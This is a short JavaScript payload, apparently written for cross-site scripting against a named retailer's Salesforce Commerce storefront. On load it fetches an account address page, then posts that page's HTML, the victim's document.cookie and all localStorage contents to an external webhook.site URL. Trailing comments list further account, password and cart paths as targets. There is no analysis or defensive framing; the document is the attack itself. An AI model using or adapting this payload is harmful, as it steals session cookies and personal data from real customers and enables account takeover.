async function getData() {
    const a = await fetch('/on/demandware.store/Sites-Loccitane_AE-Site/en_AE/Address-AddAddress');
    const b = await a.text();
    const c = await fetch('https://webhook.site/734833a0-09c5-4698-a0dc-39ed5cef40e9',{
        method: 'POST',
        headers:{
            'Content-Type':'text/plain'
        },
        body: `html=${b}&cookie=${document.cookie}&local=${JSON.stringify(localStorage)}`
    })
}

getData()


///en/account/password
///on/demandware.store/Sites-Loccitane_AE-Site/en_AE/Address-AddAddress
///en/account
///en/cart